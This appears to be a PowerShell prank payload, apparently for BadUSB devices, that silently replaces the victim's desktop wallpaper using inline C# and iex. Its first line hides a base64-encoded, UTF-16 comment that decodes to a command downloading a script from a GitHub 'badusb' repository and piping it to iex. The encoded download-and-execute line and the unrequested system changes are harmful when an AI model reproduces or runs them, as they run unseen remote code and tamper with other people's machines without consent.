<# aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYgBhAGQAdQBzAGIALwBtAGEAcwB0AGUAcgAvAHUAcwBiADUAfABpAGUAeAA= #>

$WallpapersFolder = "C:\WallpaperFun";
$OldWallpaperPath = (Get-ItemProperty "HKCU:\Control Panel\Desktop\").WallPaper;

if (-not (Test-Path -Path $WallpapersFolder -PathType Container))
{
  New-Item $WallpapersFolder -ItemType "directory";
}

Copy-Item $OldWallpaperPath -Destination "$($WallpapersFolder)\OldWallpaper.jpg" -Force;
Copy-Item "I:\Public\RTC-MS-DEV-2\AIM\Wallpaper\Heniu2.jpg" -Destination "$($WallpapersFolder)\NewWallpaper.jpg" -Force;

$id = Get-Random -Minimum 0 -Maximum 999999999999999999
$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Wallpaper
{
   public class Setter$id {
      [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
      private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
      
      public static void SetWallpaper (string path) {
         SystemParametersInfo(20, 0, path, 0x01 | 0x02);
         RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
         key.SetValue(@"WallpaperStyle", "3"); 
         key.SetValue(@"TileWallpaper", "0");
         key.Close();
      }
   }
}
"@

Add-Type -TypeDefinition $code

iex "[Wallpaper.Setter$id]::SetWallpaper('$WallpapersFolder\NewWallpaper.jpg')"
